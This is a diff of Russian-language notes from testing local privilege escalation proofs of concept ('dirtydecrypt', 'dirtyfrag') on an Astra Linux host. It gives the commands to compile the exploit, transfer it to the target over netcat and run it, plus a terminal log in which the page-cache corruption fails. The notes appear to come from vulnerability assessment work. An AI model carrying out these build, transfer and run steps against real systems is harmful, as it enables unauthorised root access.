@@ -80,25 +80,33 @@ dirtyfrag: failed (rc=4)
 
 
 
-2) *test in progress*
+2) Остальные тесты:
 
 
-Также проверена dirtydecrypt:
-Скомпилить для астры:
+Также проверена dirtydecrypt, не работает на астре.
 
-На сервере *ip address*, где лежит файл:
+---
+Команды для компилирования и передачи:
 
+1) На сервере *ip address*, где лежит файл:
+```
 cd ~/testLPE/crypt
 gcc -O0 -Wall -o dirtydecrypt poc.c
 nc -l -p 1234 < dirtydecrypt
+```
 
-На клиенте (alse), куда нужно скопировать:
-
+2) На клиенте (alse), куда нужно скопировать:
+```
 nc *ip address* 1234 > dirtydecrypt
 chmod +x dirtydecrypt
-./dirtydecrypt
+```
 
-Логи терминала теста:
+3) запуск
+```
+./dirtydecrypt
+```
+
+## Results:
 astra@alse:~/Desktop$ ./dirtydecrypt 
 
 === rxgk pagecache write ===
@@ -109,4 +117,4 @@ uid=1000 euid=1000
 [-] corruption failed (status 0x200)
 
 
-Уязвимость не работает
+
